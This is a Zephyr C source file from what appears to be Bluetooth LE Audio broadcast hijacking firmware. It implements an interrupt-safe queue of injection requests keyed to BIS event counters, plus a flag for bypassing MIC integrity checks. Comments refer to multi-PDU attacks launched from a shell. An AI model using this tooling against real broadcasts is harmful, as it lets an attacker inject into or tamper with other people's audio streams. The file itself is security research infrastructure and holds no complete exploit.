/*
 * SPDX-License-Identifier: Apache-2.0
 *
 */

#include <errno.h>
#include <stdint.h>
#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/sys/atomic.h>

#include "bison_lll_hijack.h"

#define BISON_LLL_HIJACK_QUEUE_LEN 64U

static struct bison_lll_hijack_req queue[BISON_LLL_HIJACK_QUEUE_LEN];
static uint8_t queue_head;   /* next slot to read (LLL side) */
static uint8_t queue_tail;   /* next slot to write (thread side) */
static uint8_t queue_count;

int bison_lll_hijack_enqueue(const struct bison_lll_hijack_req *req)
{
	unsigned int key;
	int err = 0;

	if (!req) {
		return -EINVAL;
	}

	key = irq_lock();
	if (queue_count >= BISON_LLL_HIJACK_QUEUE_LEN) {
		err = -ENOSPC;
		goto out;
	}
	memcpy(&queue[queue_tail], req, sizeof(*req));
	queue_tail = (queue_tail + 1U) % BISON_LLL_HIJACK_QUEUE_LEN;
	queue_count++;
out:
	irq_unlock(key);
	return err;
}

/* Free slots right now. Used by the shell to pre-check that a
 * multi-entry attack (e.g. `bison ctrl_all`) will fit before we start
 * enqueueing - a partial enqueue leaves signal PDUs without their
 * matching CTRL PDU, which is worse than not attempting the attack.
 */
int bison_lll_hijack_available(void)
{
	unsigned int key;
	int free_slots;

	key = irq_lock();
	free_slots = (int)(BISON_LLL_HIJACK_QUEUE_LEN - queue_count);
	irq_unlock(key);
	return free_slots;
}

static uint32_t early_us;

void bison_lll_hijack_set_early_us(uint32_t us)
{
	early_us = us;
}

uint32_t bison_lll_hijack_get_early_us(void)
{
	return early_us;
}

/* 
 * Bypass MIC checks to receive encrypted raw BIS PDUs
 */
static bool bisquit_bypass;

void bison_lll_hijack_bisquit_bypass_set(bool active)
{
	bisquit_bypass = active;
}

bool bison_lll_hijack_bisquit_bypass_get(void)
{
	return bisquit_bypass;
}

/* Peek without removing. Returns pointer to the head entry if one
 * matches event_counter, NULL otherwise. Safe to call from LLL /
 * ISR context. Pointer stays valid until the matching _consume().
 */
const struct bison_lll_hijack_req *bison_lll_hijack_peek(uint16_t event_counter)
{
	unsigned int key;
	const struct bison_lll_hijack_req *r = NULL;

	key = irq_lock();
	if (queue_count > 0U && queue[queue_head].event_counter == event_counter) {
		r = &queue[queue_head];
	}
	irq_unlock(key);
	return r;
}

/* Pop the head entry. Call after successfully consuming what
 * _peek() returned.
 */
void bison_lll_hijack_consume(void)
{
	unsigned int key;

	key = irq_lock();
	if (queue_count > 0U) {
		queue_head = (queue_head + 1U) % BISON_LLL_HIJACK_QUEUE_LEN;
		queue_count--;
	}
	irq_unlock(key);
}

/* Drop any entries whose event_counter is now in the past (or the
 * current event). Called by the LLL when the SYNC_ISO event fires
 * so stale requests don't sit at the head of the queue and block
 * newer legitimate ones.
 */
void bison_lll_hijack_flush_stale(uint16_t event_counter)
{
	unsigned int key;

	key = irq_lock();
	while (queue_count > 0U) {
		int16_t delta = (int16_t)(queue[queue_head].event_counter -
					  event_counter);

		if (delta > 0) {
			break;  /* head is in the future - keep */
		}
		queue_head = (queue_head + 1U) % BISON_LLL_HIJACK_QUEUE_LEN;
		queue_count--;
	}
	irq_unlock(key);
}
